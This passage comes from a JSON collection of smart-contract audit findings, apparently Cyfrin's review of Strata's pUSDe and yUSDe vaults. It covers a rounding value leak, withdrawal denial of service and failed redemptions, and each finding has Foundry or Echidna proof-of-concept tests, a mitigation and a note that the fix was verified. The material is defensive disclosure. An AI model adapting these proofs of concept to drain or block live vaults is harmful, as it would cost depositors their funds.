account;\n\n    address alice = makeAddr(\"alice\");\n    address bob = makeAddr(\"bob\");\n\n    function setUp() public {\n        address owner = msg.sender;\n\n        USDe = new MockUSDe();\n        sUSDe = new MockStakedUSDe(USDe, owner, owner);\n\n        pUSDe = pUSDeVault(\n            address(\n                new ERC1967Proxy(\n                    address(new pUSDeVault()),\n                    abi.encodeWithSelector(pUSDeVault.initialize.selector, owner, USDe, sUSDe)\n                )\n            )\n        );\n\n        yUSDe = yUSDeVault(\n            address(\n                new ERC1967Proxy(\n                    address(new yUSDeVault()),\n                    abi.encodeWithSelector(yUSDeVault.initialize.selector, owner, USDe, sUSDe, pUSDe)\n                )\n            )\n        );\n\n        vm.startPrank(owner);\n        pUSDe.setDepositsEnabled(true);\n        pUSDe.setWithdrawalsEnabled(true);\n        pUSDe.updateYUSDeVault(address(yUSDe));\n\n        // deposit USDe and burn minimum shares to avoid reverting on redemption\n        uint256 initialUSDeAmount = pUSDe.previewMint(MIN_SHARES);\n        USDe.mint(owner, initialUSDeAmount);\n        USDe.approve(address(pUSDe), initialUSDeAmount);\n        pUSDe.mint(MIN_SHARES, address(0xdead));\n        vm.stopPrank();\n\n        if (pUSDe.balanceOf(address(0xdead)) != MIN_SHARES) {\n            revert(\"address(0xdead) should have MIN_SHARES shares of pUSDe\");\n        }\n    }\n\n    function test_rounding() public {\n        uint256 userDeposit = 100 ether;\n\n        // fund users\n        USDe.mint(alice, userDeposit);\n        USDe.mint(bob, userDeposit);\n\n        // alice deposits into pUSDe\n        vm.startPrank(alice);\n        USDe.approve(address(pUSDe), userDeposit);\n        uint256 aliceShares_pUSDe = pUSDe.deposit(userDeposit, alice);\n        vm.stopPrank();\n\n        // bob deposits into pUSDe\n        vm.startPrank(bob);\n        USDe.approve(address(pUSDe), userDeposit);\n        uint256 bobShares_pUSDe = pUSDe.deposit(userDeposit, bob);\n        vm.stopPrank();\n\n        // setup assertions\n        assertEq(pUSDe.balanceOf(alice), aliceShares_pUSDe, \"Alice should have shares equal to her deposit\");\n        assertEq(pUSDe.balanceOf(bob), bobShares_pUSDe, \"Bob should have shares equal to his deposit\");\n\n        {\n            // phase change\n            account = msg.sender;\n            uint256 initialAdminTransferAmount = 1e6;\n            vm.startPrank(account);\n            USDe.mint(account, initialAdminTransferAmount);\n            USDe.approve(address(pUSDe), initialAdminTransferAmount);\n            pUSDe.deposit(initialAdminTransferAmount, address(yUSDe));\n            pUSDe.startYieldPhase();\n            yUSDe.setDepositsEnabled(true);\n            yUSDe.setWithdrawalsEnabled(true);\n            vm.stopPrank();\n        }\n\n        // bob deposits into yUSDe\n        vm.startPrank(bob);\n        pUSDe.approve(address(yUSDe), bobShares_pUSDe);\n        uint256 bobShares_yUSDe = yUSDe.deposit(bobShares_pUSDe, bob);\n        vm.stopPrank();\n\n        // simulate sUSDe yield transfer\n        uint256 sUSDeYieldAmount = 1_000 ether;\n        USDe.mint(address(sUSDe), sUSDeYieldAmount);\n\n        // alice redeems from pUSDe\n        uint256 aliceBalanceBefore_sUSDe = sUSDe.balanceOf(alice);\n        vm.prank(alice);\n        uint256 aliceRedeemed_USDe_reported = pUSDe.redeem(aliceShares_pUSDe, alice, alice);\n        uint256 aliceRedeemed_sUSDe = sUSDe.balanceOf(alice) - aliceBalanceBefore_sUSDe;\n        uint256 aliceRedeemed_USDe_actual = sUSDe.previewRedeem(aliceRedeemed_sUSDe);\n\n        // bob redeems from yUSDe\n        uint256 bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);\n        vm.prank(bob);\n        uint256 bobRedeemed_pUSDe_reported = yUSDe.redeem(bobShares_yUSDe, bob, bob);\n        uint256 bobRedeemed_sUSDe = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;\n        uint256 bobRedeemed_USDe = sUSDe.previewRedeem(bobRedeemed_sUSDe);\n\n        console2.log(\"Alice redeemed sUSDe: %s\", aliceRedeemed_sUSDe);\n        console2.log(\"Alice redeemed USDe (reported): %s\", aliceRedeemed_USDe_reported);\n        console2.log(\"Alice redeemed USDe (actual): %s\", aliceRedeemed_USDe_actual);\n\n        console2.log(\"Bob redeemed pUSDe (reported): %s\", bobRedeemed_pUSDe_reported);\n        console2.log(\"Bob redeemed pUSDe (actual): %s\", bobShares_pUSDe);\n        console2.log(\"Bob redeemed sUSDe: %s\", bobRedeemed_sUSDe);\n        console2.log(\"Bob redeemed USDe: %s\", bobRedeemed_USDe);\n\n        // post-redemption assertions\n        assertEq(\n            aliceRedeemed_USDe_reported,\n            aliceRedeemed_USDe_actual,\n            \"Alice's reported and actual USDe redemption amounts should match\"\n        );\n\n        assertGe(\n            bobRedeemed_pUSDe_reported,\n            bobShares_pUSDe,\n            \"Bob should redeem at least the same amount of pUSDe as his original deposit\"\n        );\n\n        assertGe(\n            bobRedeemed_USDe, userDeposit, \"Bob should redeem at least the same amount of USDe as his initial deposit\"\n        );\n\n        assertLe(\n            aliceRedeemed_USDe_actual,\n            userDeposit,\n            \"Alice should redeem no more than the same amount of USDe as her initial deposit\"\n        );\n    }\n}\n```\n\nThe following Echidna optimization test can also be run to maximise this discrepancy:\n\n```solidity\n// SPDX-License-Identifier: GPL-2.0\npragma solidity ^0.8.0;\n\nimport {BaseSetup} from \"@chimera/BaseSetup.sol\";\nimport {CryticAsserts} from \"@chimera/CryticAsserts.sol\";\nimport {vm} from \"@chimera/Hevm.sol\";\n\nimport {pUSDeVault} from \"contracts/predeposit/pUSDeVault.sol\";\nimport {yUSDeVault} from \"contracts/predeposit/yUSDeVault.sol\";\nimport {MockUSDe} from \"contracts/test/MockUSDe.sol\";\nimport {MockStakedUSDe} from \"contracts/test/MockStakedUSDe.sol\";\nimport {ERC1967Proxy} from \"@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol\";\n\n// echidna . --contract CryticRoundingTester --config echidna_rounding.yaml --format text --workers 16 --test-limit 1000000\ncontract CryticRoundingTester is BaseSetup, CryticAsserts {\n    uint256 constant MIN_SHARES = 0.1 ether;\n\n    MockUSDe USDe;\n    MockStakedUSDe sUSDe;\n    pUSDeVault pUSDe;\n    yUSDeVault yUSDe;\n\n    address owner;\n    address alice = address(uint160(uint256(keccak256(abi.encodePacked(\"alice\")))));\n    address bob = address(uint160(uint256(keccak256(abi.encodePacked(\"bob\")))));\n    uint256 severity;\n\n    constructor() payable {\n        setup();\n    }\n\n    function setup() internal virtual override {\n        owner = msg.sender;\n\n        USDe = new MockUSDe();\n        sUSDe = new MockStakedUSDe(USDe, owner, owner);\n\n        pUSDe = pUSDeVault(\n            address(\n                new ERC1967Proxy(\n                    address(new pUSDeVault()),\n                    abi.encodeWithSelector(pUSDeVault.initialize.selector, owner, USDe, sUSDe)\n                )\n            )\n        );\n\n        yUSDe = yUSDeVault(\n            address(\n                new ERC1967Proxy(\n                    address(new yUSDeVault()),\n                    abi.encodeWithSelector(yUSDeVault.initialize.selector, owner, USDe, sUSDe, pUSDe)\n                )\n            )\n        );\n\n        vm.startPrank(owner);\n        pUSDe.setDepositsEnabled(true);\n        pUSDe.setWithdrawalsEnabled(true);\n        pUSDe.updateYUSDeVault(address(yUSDe));\n\n        // deposit USDe and burn minimum shares to avoid reverting on redemption\n        uint256 initialUSDeAmount = pUSDe.previewMint(MIN_SHARES);\n        USDe.mint(owner, initialUSDeAmount);\n        USDe.approve(address(pUSDe), initialUSDeAmount);\n        pUSDe.mint(MIN_SHARES, address(0xdead));\n        vm.stopPrank();\n\n        if (pUSDe.balanceOf(address(0xdead)) != MIN_SHARES) {\n            revert(\"address(0xdead) should have MIN_SHARES shares of pUSDe\");\n        }\n    }\n\n    function target(uint256 aliceDeposit, uint256 bobDeposit, uint256 sUSDeYieldAmount) public {\n        aliceDeposit = between(aliceDeposit, 1, 100_000 ether);\n        bobDeposit = between(bobDeposit, 1, 100_000 ether);\n        sUSDeYieldAmount = between(sUSDeYieldAmount, 1, 500_000 ether);\n        precondition(aliceDeposit <= 100_000 ether);\n        precondition(bobDeposit <= 100_000 ether);\n        precondition(sUSDeYieldAmount <= 500_000 ether);\n\n        // fund users\n        USDe.mint(alice, aliceDeposit);\n        USDe.mint(bob, bobDeposit);\n\n        // alice deposits into pUSDe\n        vm.startPrank(alice);\n        USDe.approve(address(pUSDe), aliceDeposit);\n        uint256 aliceShares_pUSDe = pUSDe.deposit(aliceDeposit, alice);\n        vm.stopPrank();\n\n        // bob deposits into pUSDe\n        vm.startPrank(bob);\n        USDe.approve(address(pUSDe), bobDeposit);\n        uint256 bobShares_pUSDe = pUSDe.deposit(bobDeposit, bob);\n        vm.stopPrank();\n\n        // setup assertions\n        eq(pUSDe.balanceOf(alice), aliceShares_pUSDe, \"Alice should have shares equal to her deposit\");\n        eq(pUSDe.balanceOf(bob), bobShares_pUSDe, \"Bob should have shares equal to his deposit\");\n\n        {\n            // phase change\n            uint256 initialAdminTransferAmount = 1e6;\n            vm.startPrank(owner);\n            USDe.mint(owner, initialAdminTransferAmount);\n            USDe.approve(address(pUSDe), initialAdminTransferAmount);\n            pUSDe.deposit(initialAdminTransferAmount, address(yUSDe));\n            pUSDe.startYieldPhase();\n            yUSDe.setDepositsEnabled(true);\n            yUSDe.setWithdrawalsEnabled(true);\n            vm.stopPrank();\n        }\n\n        // bob deposits into yUSDe\n        vm.startPrank(bob);\n        pUSDe.approve(address(yUSDe), bobShares_pUSDe);\n        uint256 bobShares_yUSDe = yUSDe.deposit(bobShares_pUSDe, bob);\n        vm.stopPrank();\n\n        // simulate sUSDe yield transfer\n        USDe.mint(address(sUSDe), sUSDeYieldAmount);\n\n        // alice redeems from pUSDe\n        uint256 aliceBalanceBefore_sUSDe = sUSDe.balanceOf(alice);\n        vm.prank(alice);\n        uint256 aliceRedeemed_USDe_reported = pUSDe.redeem(aliceShares_pUSDe, alice, alice);\n        uint256 aliceRedeemed_sUSDe = sUSDe.balanceOf(alice) - aliceBalanceBefore_sUSDe;\n        uint256 aliceRedeemed_USDe_actual = sUSDe.previewRedeem(aliceRedeemed_sUSDe);\n\n        // bob redeems from yUSDe\n        uint256 bobBalanceBefore_sUSDe = sUSDe.balanceOf(bob);\n        vm.prank(bob);\n        uint256 bobRedeemed_pUSDe_reported = yUSDe.redeem(bobShares_yUSDe, bob, bob);\n        uint256 bobRedeemed_sUSDe = sUSDe.balanceOf(bob) - bobBalanceBefore_sUSDe;\n        uint256 bobRedeemed_USDe = sUSDe.previewRedeem(bobRedeemed_sUSDe);\n\n        // optimize\n        if (aliceRedeemed_USDe_actual > aliceDeposit) {\n            uint256 diff = aliceRedeemed_USDe_actual - aliceDeposit;\n            if (diff > severity) {\n                severity = diff;\n            }\n        }\n    }\n\n    function echidna_opt_severity() public view returns (uint256) {\n        return severity;\n    }\n}\n```\n\nConfig:\n```yaml\ntestMode: \"optimization\"\nprefix: \"echidna_\"\ncoverage: true\ncorpusDir: \"echidna_rounding\"\nbalanceAddr: 0x1043561a8829300000\nbalanceContract: 0x1043561a8829300000\nfilterFunctions: []\ncryticArgs: [\"--foundry-compile-all\"]\ndeployer: \"0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496\"\ncontractAddr: \"0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496\"\nshrinkLimit: 100000\n```\n\nOutput:\n```bash\nechidna_opt_severity: max value: 444330\n```\n\n**Recommended Mitigation:** Rather than calling `previewWithdraw()` which rounds up, call `convertToShares()` which rounds down:\n\n```solidity\nfunction previewWithdraw(uint256 assets) public view virtual override returns (uint256) {\n    return _convertToShares(assets, Math.Rounding.Up);\n}\n\nfunction convertToShares(uint256 assets) public view virtual override returns (uint256) {\n    return _convertToShares(assets, Math.Rounding.Down);\n}\n```\n\n**Strata:** Fixed in commit [59fcf23](https://github.com/Strata-Money/contracts/commit/59fcf239a9089d14f02621a7f692bcda6c85690e).\n\n**Cyfrin:** Verified. The sUSDe to transfer out to the receiver is now calculated using `convertToShares()` which rounds down.\n\n\\clearpage",
      "summary": "The bug report describes an issue where the redemption of pUSDe and yUSDe tokens in the yield phase results in value leaking from the system in favor of pUSDe redemptions. This is due to a rounding error in the `pUSDeVault::_withdraw` function where the sUSDe balance is calculated using `previewWithdraw()` which rounds up, but the rounded sUSDe amount is transferred out of the protocol, resulting in a discrepancy between the reported and actual redemption amounts. A proof of concept test is provided to demonstrate the issue and it is recommended to apply the fix proposed in commit [59fcf23](https://github.com/Strata-Money/contracts/commit/59fcf239a9089d14f02621a7f692bcda6c85690e). The report has been verified and the bug has been fixed.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57018",
      "title": "DoS of meta vault withdrawals during points phase if one vault is paused or attempted redemption exceeds the maximum",
      "impact": "MEDIUM",
      "content": "**Description:** `pUSDeVault::_withdraw` assumes any `USDe` shortfall is covered by the multi-vaults; however, `redeemRequiredBaseAssets()` does not guarantee that the required assets are available or actually withdrawn, so the subsequent ERC-20 token transfer could fail and DoS withdrawals if the ERC-4626 withdrawal does not already revert. Usage of `ERC4626Upgradeable::previewRedeem` in `redeemRequiredBaseAssets()` is problematic as this could attempt to withdraw more assets than the vault will allow. Per the [ERC-4626 specification](https://eips.ethereum.org/EIPS/eip-4626), `previewRedeem()`:\n> * MUST NOT account for redemption limits like those returned from maxRedeem and should always act as though the redemption would be accepted, regardless if the user has enough shares, etc.\n> * MUST NOT revert due to vault specific user/global limits. MAY revert due to other conditions that would also cause redeem to revert.\n\nSo an availability-aware check such as `maxWithdraw()` which considers pause states and any other limits should be used instead to prevent one vault reverting when it may be possible to process the withdrawal by redeeming from another.\n\n**Impact:** If one of the supported meta vaults is paused or experiences a hack of the underlying `USDe` which results in a decrease in share price during the points phase then this will prevent withdrawals from being processed even if it is possible to do so by redeeming from another.\n\n**Proof of Concept:** First modify the `MockERC4626` to simulate a vault that pauses deposits/withdrawals and could return fewer assets when querying `maxWithdraw()` when compared with `previewRedeem()`:\n\n```solidity\ncontract MockERC4626 is ERC4626 {\n    bool public depositsEnabled;\n    bool public withdrawalsEnabled;\n    bool public hacked;\n\n    error DepositsDisabled();\n    error WithdrawalsDisabled();\n\n    event DepositsEnabled(bool enabled);\n    event WithdrawalsEnabled(bool enabled);\n\n    constructor(IERC20 token) ERC20(\"MockERC4626\", \"M4626\") ERC4626(token)  {}\n\n    function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal override {\n        if (!depositsEnabled) {\n            revert DepositsDisabled();\n        }\n\n        super._deposit(caller, receiver, assets, shares);\n    }\n\n    function _withdraw(address caller, address receiver, address owner, uint256 assets, uint256 shares)\n        internal\n        override\n    {\n        if (!withdrawalsEnabled) {\n            revert WithdrawalsDisabled();\n        }\n\n        super._withdraw(caller, receiver, owner, assets, shares);\n    }\n\n    function maxWithdraw(address owner) public view override returns (uint256) {\n        if (!withdrawalsEnabled) {\n            revert WithdrawalsDisabled();\n        }\n\n        if (hacked) {\n            return super.maxWithdraw(owner) / 2; // Reduce max withdraw by half to simulate some limit\n        }\n        return super.maxWithdraw(owner);\n    }\n\n    function totalAssets() public view override returns (uint256) {\n        if (hacked) {\n            return super.totalAssets() * 3/4; // Reduce total assets by 25% to simulate some loss\n        }\n        return super.totalAssets();\n    }\n\n    function setDepositsEnabled(bool depositsEnabled_) external {\n        depositsEnabled = depositsEnabled_;\n        emit DepositsEnabled(depositsEnabled_);\n    }\n\n    function setWithdrawalsEnabled(bool withdrawalsEnabled_) external {\n        withdrawalsEnabled = withdrawalsEnabled_;\n        emit WithdrawalsEnabled(withdrawalsEnabled_);\n    }\n\n    function hack() external {\n        hacked = true;\n    }\n}\n```\n\nThe following test can then be run in `pUSDeVault.t.sol`:\n```solidity\nerror WithdrawalsDisabled();\nerror ERC4626ExceededMaxWithdraw(address owner, uint256 assets, uint256 max);\nerror ERC20InsufficientBalance(address from, uint256 balance, uint256 amount);\n\nfunction test_redeemRequiredBaseAssetsDoS() public {\n    assert(address(USDe) != address(0));\n\n    account = msg.sender;\n\n    // deposit USDe\n    USDe.mint(account, 10 ether);\n    deposit(USDe, 10 ether);\n    assertBalance(pUSDe, account, 10 ether, \"Initial deposit\");\n\n    // deposit eUSDe\n    USDe.mint(account, 10 ether);\n    USDe.approve(address(eUSDe), 10 ether);\n    eUSDe.setDepositsEnabled(true);\n    eUSDe.deposit(10 ether, account);\n    assertBalance(eUSDe, account, 10 ether, \"Deposit to eUSDe\");\n    eUSDe.approve(address(pUSDeDepositor), 10 ether);\n    pUSDeDepositor.deposit(eUSDe, 10 ether, account);\n\n    // simulate trying to withdraw from the eUSDe vault when it is paused\n    uint256 withdrawAmount = 20 ether;\n    eUSDe.setWithdrawalsEnabled(false);\n    vm.expectRevert(abi.encodeWithSelector(WithdrawalsDisabled.selector));\n    pUSDe.withdraw(address(USDe), withdrawAmount, account, account);\n    eUSDe.setWithdrawalsEnabled(true);\n\n\n    // deposit USDe from another account\n    account = address(0x1234);\n    vm.startPrank(account);\n    USDe.mint(account, 10 ether);\n    USDe.approve(address(eUSDe), 10 ether);\n    eUSDe.deposit(10 ether, account);\n    assertBalance(eUSDe, account, 10 ether, \"Deposit to eUSDe\");\n    eUSDe.approve(address(pUSDeDepositor), 10 ether);\n    pUSDeDepositor.deposit(eUSDe, 10 ether, account);\n    vm.stopPrank();\n    account = msg.sender;\n    vm.startPrank(account);\n\n    // deposit eUSDe2\n    USDe.mint(account, 5 ether);\n    USDe.approve(address(eUSDe2), 5 ether);\n    eUSDe2.setDepositsEnabled(true);\n    eUSDe2.deposit(5 ether, account);\n    assertBalance(eUSDe2, account, 5 ether, \"Deposit to eUSDe2\");\n    eUSDe2.approve(address(pUSDeDepositor), 5 ether);\n    pUSDeDepositor.deposit(eUSDe2, 5 ether, account);\n\n\n    // simulate when previewRedeem() in redeemRequiredBaseAssets() returns more than maxWithdraw() during withdrawal\n    // as a result of a hack and imposition of a limit\n    eUSDe.hack();\n    uint256 maxWithdraw = eUSDe.maxWithdraw(address(pUSDe));\n    vm.expectRevert(abi.encodeWithSelector(ERC4626ExceededMaxWithdraw.selector, address(pUSDe), withdrawAmount/2, maxWithdraw));\n    pUSDe.withdraw(address(USDe), withdrawAmount, account, account);\n\n    // attempt to withdraw from eUSDe2 vault, but redeemRequiredBaseAssets() skips withdrawal attempt\n    // so there are insufficient assets to cover the subsequent transfer even though there is enough in the vaults\n    eUSDe2.setWithdrawalsEnabled(true);\n    vm.expectRevert(abi.encodeWithSelector(ERC20InsufficientBalance.selector, address(pUSDe), eUSDe2.balanceOf(address(pUSDe)), withdrawAmount));\n    pUSDe.withdraw(address(eUSDe2), withdrawAmount, account, account);\n}\n```\n\n**Recommended Mitigation:**\n```diff\n    function redeemRequiredBaseAssets (uint baseTokens) internal {\n        for (uint i = 0; i < assetsArr.length; i++) {\n            IERC4626 vault = IERC4626(assetsArr[i].asset);\n--          uint totalBaseTokens = vault.previewRedeem(vault.balanceOf(address(this)));\n++          uint256 totalBaseTokens = vault.maxWithdraw(address(this));\n            if (totalBaseTokens >= baseTokens) {\n                vault.withdraw(baseTokens, address(this), address(this));\n                break;\n            }\n        }\n    }\n```\n\n**Strata:** Fixed in commit [4efba0c](https://github.com/Strata-Money/contracts/commit/4efba0c484a3bd6d4934e0f1ec0eb91848c94298).\n\n**Cyfrin:** Verified.",
      "summary": "\nThe bug report highlights an issue with the `pUSDeVault::_withdraw` function, which assumes that any shortfall of the `USDe` token is covered by the multi-vaults. However, the `redeemRequiredBaseAssets()` function does not guarantee that the required assets are actually available or withdrawn, potentially causing the subsequent ERC-20 token transfer to fail and causing a denial-of-service (DoS) for withdrawals. This is because the `redeemRequiredBaseAssets()` function uses `ERC4626Upgradeable::previewRedeem`, which does not take into account any redemption limits set by the vaults. This can lead to a situation where one vault is unable to process a withdrawal, even if another vault could potentially cover it.\n\nThe impact of this bug is that if one of the supported meta-vaults is paused or experiences a hack that results in a decrease in share price during the points phase, it will prevent withdrawals from being processed, even if it is possible to do so by redeeming from another vault.\n\nTo demonstrate this issue, a test was run in `pUSDeVault.t.sol`, where a mock vault was created to simulate a pause in deposits and withdrawals, and a decrease in assets due to a hack. The test showed that withdrawals could fail due to the lack of available assets, even though there were enough assets in the vaults to cover the withdrawal.\n\nTo mitigate this issue, the recommended solution is to use a new function called `maxWithdraw()`, which takes into account pause states and other limits, instead of using `previewRedeem()`. This change has been implemented in the Strata contracts in commit [4efba0c](https://github.com/Strata-Money/contracts/commit/4efba0c484a3bd6d4934e0f1ec0eb91848c94298). The bug has been verified and fixed by Cyfrin. ",
      "quality_score": 5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57017",
      "title": "`MetaVault::redeemRequiredBaseAssets` should be able to redeem small amounts from each vault to fill requested amount and avoid redeeming more than requested",
      "impact": "MEDIUM",
      "content": "**Description:** `MetaVault::redeemRequiredBaseAssets` is supposed to iterate through the supported vaults, redeeming assets until the required amount of base assets is obtained:\n```solidity\n/// @notice Iterates through supported vaults and redeems assets until the required amount of base tokens is obtained\n```\n\nIts implementation however only retrieves from a supported vault if that one withdrawal can satisfy the desired amount:\n```solidity\nfunction redeemRequiredBaseAssets (uint baseTokens) internal {\n    for (uint i = 0; i < assetsArr.length; i++) {\n        IERC4626 vault = IERC4626(assetsArr[i].asset);\n        uint totalBaseTokens = vault.previewRedeem(vault.balanceOf(address(this)));\n        // @audit only withdraw if a single withdraw can satisfy desired amount\n        if (totalBaseTokens >= baseTokens) {\n            vault.withdraw(baseTokens, address(this), address(this));\n            break;\n        }\n    }\n}\n```\n\n**Impact:** This has a number of potential problems:\n1) if no single withdraw can satisfy the desired amount, then the calling function will revert due to insufficient funds even if the desired amount could be satisfied by multiple smaller withdrawals from different supported vaults\n2) a single withdraw may be greater than the desired amount, leaving `USDe` tokens inside the vault contract. This is suboptimal as then they would not be earning yield by being staked in `sUSDe`, and there appears to be no way for the contract owner to trigger the staking once the yield phase has started, since supporting vaults can be added and deposits for them work during the yield phase\n\n**Recommended Mitigation:** `MetaVault::redeemRequiredBaseAssets` should:\n* keep track of the total currently redeemed amount\n* calculate the remaining requested amount as the requested amount minus the total currently redeemed amount\n* if the current vault is not able to redeem the remaining requested amount, redeem as much as possible and increase the total currently redeemed amount by the amount redeemed\n* if the current vault could redeem more than the remaining requested amount, redeem only enough to satisfy the remaining requested amount\n\nThe above strategy ensures that:\n* small amounts from multiple vaults can be used to fulfill the requested amount\n* greater amounts than requested are not withdrawn, so no `USDe` tokens remain inside the vault unable to be staked and not earning yield\n\n**Strata:** Fixed in commits [4efba0c](https://github.com/Strata-Money/contracts/commit/4efba0c484a3bd6d4934e0f1ec0eb91848c94298), [7e6e859](https://github.com/Strata-Money/contracts/commit/7e6e8594c05ea7e3837ddbe7395b4a15ea34c7e9).\n\n**Cyfrin:** Verified.",
      "summary": "\nThis bug report discusses an issue with the `MetaVault::redeemRequiredBaseAssets` function, which is supposed to redeem assets from supported vaults until a desired amount of base assets is obtained. However, the current implementation only withdraws from a supported vault if that one withdrawal can satisfy the desired amount, which can lead to problems. These problems include the possibility of the calling function reverting due to insufficient funds if no single withdrawal can satisfy the desired amount, and the potential for `USDe` tokens to remain inside the vault contract instead of being staked and earning yield. To mitigate these issues, it is recommended that the function keep track of the total currently redeemed amount and only withdraw as much as needed to fulfill the remaining requested amount. This bug has been fixed in the Strata contracts and has been verified by Cyfrin.",
      "quality_score": 5,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
    {
      "id": "57016",
      "title": "During the yield phase, when using supported vaults, users can't withdraw vault assets they are entitled to",
      "impact": "HIGH",
      "content": "**Description:** During the yield phase, when using supported vaults, users can't withdraw vault assets they are entitled to.\n\n**Proof of Concept:**\n```solidity\nfunction test_yieldPhase_supportedVaults_userCantWithdrawVaultAssets() external {\n    // user1 deposits $1000 USDe into the main vault\n    uint256 user1AmountInMainVault = 1000e18;\n    USDe.mint(user1, user1AmountInMainVault);\n\n    vm.startPrank(user1);\n    USDe.approve(address(pUSDe), user1AmountInMainVault);\n    uint256 user1MainVaultShares = pUSDe.deposit(user1AmountInMainVault, user1);\n    vm.stopPrank();\n\n    assertEq(pUSDe.totalAssets(), user1AmountInMainVault);\n    assertEq(pUSDe.balanceOf(user1), user1MainVaultShares);\n\n    // admin triggers yield phase on main vault which stakes all vault's USDe\n    pUSDe.startYieldPhase();\n    // totalAssets() still returns same amount as it is overridden in pUSDeVault\n    assertEq(pUSDe.totalAssets(), user1AmountInMainVault);\n    // balanceOf shows pUSDeVault has deposited its USDe in sUSDe\n    assertEq(USDe.balanceOf(address(pUSDe)), 0);\n    assertEq(USDe.balanceOf(address(sUSDe)), user1AmountInMainVault);\n\n    // create an additional supported ERC4626 vault\n    MockERC4626 newSupportedVault = new MockERC4626(USDe);\n    pUSDe.addVault(address(newSupportedVault));\n    // add eUSDe again since `startYieldPhase` removes it\n    pUSDe.addVault(address(eUSDe));\n\n    // verify two additional vaults now suppported\n    assertTrue(pUSDe.isAssetSupported(address(eUSDe)));\n    assertTrue(pUSDe.isAssetSupported(address(newSupportedVault)));\n\n    // user2 deposits $600 into each vault\n    uint256 user2AmountInEachSubVault = 600e18;\n    USDe.mint(user2, user2AmountInEachSubVault*2);\n\n    vm.startPrank(user2);\n    USDe.approve(address(eUSDe), user2AmountInEachSubVault);\n    uint256 user2SubVaultSharesInEach = eUSDe.deposit(user2AmountInEachSubVault, user2);\n    USDe.approve(address(newSupportedVault), user2AmountInEachSubVault);\n    newSupportedVault.deposit(user2AmountInEachSubVault, user2);\n    vm.stopPrank();\n\n    // verify balances correct\n    assertEq(eUSDe.totalAssets(), user2AmountInEachSubVault);\n    assertEq(newSupportedVault.totalAssets(), user2AmountInEachSubVault);\n\n    // user2 deposits using their shares via MetaVault::deposit\n    vm.startPrank(user2);\n    eUSDe.approve(address(pUSDe), user2SubVaultSharesInEach);\n    pUSDe.deposit(address(eUSDe), user2SubVaultSharesInEach, user2);\n    newSupportedVault.approve(address(pUSDe), user2SubVaultSharesInEach);\n    pUSDe.deposit(address(newSupportedVault), user2SubVaultSharesInEach, user2);\n    vm.stopPrank();\n\n    // verify main vault total assets includes everything\n    assertEq(pUSDe.totalAssets(), user1AmountInMainVault + user2AmountInEachSubVault*2);\n    // main vault not carrying any USDe balance\n    assertEq(USDe.balanceOf(address(pUSDe)), 0);\n    // user2 lost their subvault shares\n    assertEq(eUSDe.balanceOf(user2), 0);\n    assertEq(newSupportedVault.balanceOf(user2), 0);\n    // main vault gained the subvault shares\n    assertEq(eUSDe.balanceOf(address(pUSDe)), user2SubVaultSharesInEach);\n    assertEq(newSupportedVault.balanceOf(address(pUSDe)), user2SubVaultSharesInEach);\n\n    // verify user2 entitled to withdraw their total token amount\n    assertEq(pUSDe.maxWithdraw(user2), user2AmountInEachSubVault*2);\n\n    // try and do it, reverts due to insufficient balance\n    vm.startPrank(user2);\n    vm.expectRevert(); // ERC20InsufficientBalance\n    pUSDe.withdraw(user2AmountInEachSubVault*2, user2, user2);\n\n    // try 1 wei more than largest deposit from user 1, fails for same reason\n    vm.expectRevert(); // ERC20InsufficientBalance\n    pUSDe.withdraw(user1AmountInMainVault+1, user2, user2);\n\n    // can withdraw up to max deposit amount $1000\n    pUSDe.withdraw(user1AmountInMainVault, user2, user2);\n\n    // user2 still has $200 left to withdraw\n    assertEq(pUSDe.maxWithdraw(user2), 200e18);\n\n    // trying to withdraw it reverts\n    vm.expectRevert(); // ERC20InsufficientBalance\n    pUSDe.withdraw(200e18, user2, user2);\n\n    // can't withdraw anymore, even trying 1 wei will revert\n    vm.expectRevert();\n    pUSDe.withdraw(1e18, user2, user2);\n}\n```\n\n**Recommended Mitigation:** In `pUSDeVault::_withdraw`, inside the yield-phase `if` condition, there should be a call to `redeemRequiredBaseAssets` if there is insufficient `USDe` balance to fulfill the withdrawal.\n\nAlternatively another potential fix is to not allow supported vaults to be added during the yield phase (apart from `sUSDe` which is added when the yield phase is enabled).\n\n**Strata:** Fixed in commit [076d23e](https://github.com/Strata-Money/contracts/commit/076d23e2446ad6780b2c014d66a46e54425a8769#diff-34cf784187ffa876f573d51b705940947bc06ec85f8c303c1b16a4759f59524eR190) by no longer allowing adding new supporting vaults during the yield phase.\n\n**Cyfrin:** Verified.\n\n\\clearpage",
      "summary": "\nThis bug report discusses an issue where users are unable to withdraw their vault assets during the yield phase. The bug can be reproduced by depositing funds into a supported vault, triggering the yield phase, and then attempting to withdraw the funds. The recommended solution is to make a call to redeemRequiredBaseAssets if there is not enough balance to fulfill the withdrawal. Alternatively, new supported vaults should not be allowed to be added during the yield phase. The bug has been fixed in the Strata-Money/contracts repository. ",
      "quality_score": 2.5,
      "rarity_score": 4.5,
      "report_date": {},
      "firm_name": "Cyfrin",
      "protocol_name": "Strata",
      "source_link": "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-06-11-cyfrin-strata-v2.1.md",
      "github_link": "",
      "tags": [],
      "finders": [
        "Dacian",
        "Giovanni Di Siena"
      ]
    },
